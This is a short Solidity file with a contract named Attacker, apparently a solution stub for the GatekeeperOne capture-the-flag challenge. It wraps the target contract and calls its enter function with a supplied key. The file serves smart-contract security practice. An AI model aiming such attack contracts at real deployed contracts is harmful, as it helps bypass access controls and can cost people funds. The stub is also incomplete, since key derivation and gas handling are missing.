pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attacker {
    GatekeeperOne gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperOne(_gatekeeperAddress);
    }

    function attack(bytes8 _key) public payable {
       gatekeeper.enter(_key);
    }
}